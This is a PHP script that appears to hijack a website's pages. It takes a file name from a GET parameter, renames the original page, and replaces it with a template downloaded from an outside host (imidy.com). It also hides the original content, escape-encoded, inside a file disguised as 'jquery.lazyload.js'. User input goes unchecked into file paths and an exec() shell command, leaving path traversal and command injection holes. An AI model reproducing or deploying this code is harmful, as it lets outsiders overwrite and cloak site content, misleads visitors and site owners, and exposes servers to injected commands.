<?php
global $document_root;
$document_root = dirname($_SERVER['SCRIPT_FILENAME']) . "/";
function escape($str){
    preg_match_all("/[\xc2-\xdf][\x80-\xbf]+|[\xe0-\xef][\x80-\xbf]{2}|[\xf0-\xff][\x80-\xbf]{3}|[\x01-\x7f]+/e", $str, $r);  
    //匹配utf-8字符，   
    $str = $r[0];  
    $l = count( $str );  
    for($i=0; $i<$l; $i++) {  
        $value = ord($str[$i][0]);  
        if ($value < 223){  
            $str[$i] = rawurlencode(utf8_decode($str[$i]));
        //先将utf8编码转换为ISO-8859-1编码的单字节字符，urlencode单字节字符.   
        //utf8_decode()的作用相当于iconv("UTF-8","CP1252",$v)。   
        } else {  
            $seq = strtoupper(bin2hex(iconv("UTF-8", "UCS-2", $str[$i])));
            $str[$i] = "%u" . substr($seq,2,2).substr($seq,0,2);  
        }  
    }  
    return join("", $str);  
}  

function unescape($str) {  
    $ret = '';  
    $len = strlen( $str );  
    for($i = 0; $i < $len; $i++) {  
        if($str[$i] == '%' && $str[$i + 1] == 'u'){  
            $val = hexdec(substr($str, $i + 2,4));  
            if($val < 0x7f)  
                $ret .= chr($val);  
            else if($val < 0x800)  
                $ret .= chr(0xc0|($val>>6)) . chr(0x80 | ($val & 0x3f));  
            else  
                $ret .= chr( 0xe0 | ($val >> 12)) . chr( 0x80 | (($val >> 6) & 0x3f)) . chr(0x80 | ($val & 0x3f));  
            $i += 5;  
        } else if ($str[$i] == '%'){  
            $ret .= urldecode(substr($str,$i,3));  
            $i += 2;  
        } else  
            $ret .= $str [$i];  
    }  
    return $ret;  
}  

function encrypt($file,$dir){
    $document_root = dirname($_SERVER['SCRIPT_FILENAME']) . "/";
    $js_dir = $document_root . "/" . $dir . "/";
    if(!file_exists($js_dir))
    {
        $create = mkdir($js_dir,0770);
        if(!$create)  echo "create directory $js_dir failure! please check permission!" . "<br />";
    }
    $fd = fopen($js_dir . "/jquery.lazyload.js", "w+");
    if(!$fd) echo "can't access file ${js_dir}/jquery.lazyload.js.pl check the permission". "<br />";
    $origin = file_get_contents($file);
    $origin = str_replace('http://web.nba1001.net:8888/tj/tongji.js', '',$origin);
    $encoding = mb_detect_encoding($origin,"ASCII,GB2312,GBK,UTF-8");
    if($encoding!="UTF-8")
    {
        $origin = iconv($encoding,"UTF-8",$origin);
    }
    $new = escape($origin);
    echo '<html><meta http-equiv="Content-Type" content="text/html"; charset="utf-8"><body>' . "${file}加密成功!". "</body></html>";
    fwrite($fd, "var Words =\"" . $new . '"');
    fwrite($fd, "
    function OutWord() 
    { 
    var NewWords; 
    NewWords = unescape(Words); 
    document.write(NewWords); 
    } 
    OutWord(); 
    ");
    fclose($fd);
}

$filename = $_GET['file'];
if(!$filename)
{
    echo '<html><meta http-equiv="Content-Type" content="text/html"; charset="utf-8"><body>未指明加密文件名,加密失败</body></html>';
    exit();
}
$file_array = explode('.',$filename);
$file_head = $file_array[0];
$file_tail = $file_array[1];
$js_dir = 'js_' . $file_head;
$filename = $file_head . ".html";
$source_file = $document_root . "/" . $filename .".source";
$htm_file = $document_root . "/" . $file_head . '.htm';
if (file_exists($source_file))
{
    echo $source_file . "will be encrypt" . "<br />";
    encrypt($source_file,$js_dir);
}
else
{
   if(file_exists($htm_file) and !file_exists($filename))
   {
       rename($htm_file , $document_root . $filename); 
       echo "rename $htm_file to $document_root " . $filename . "<br />";
       $cmd = "grep -l " . $htm_file . " .";
       exec($cmd,$ret);
   }
   rename($document_root . $filename , $document_root . $filename . ".source"); 
   $template = file_get_contents("http://imidy.com/360/template");
   $template = str_replace('js_placehold','<script src="'. basename($js_dir) . '/jquery.lazyload.js"></script>', $template);
   file_put_contents($document_root . "/" . $filename , $template);
   encrypt($source_file,$js_dir);
}
$show_htm = $document_root . "/" . $file_head . ".htm";
if(!file_exists($show_htm))
{
   $show_content = file_get_contents("http://imidy.com/360/show.htm");
   file_put_contents($show_htm, $show_content);
}
?>
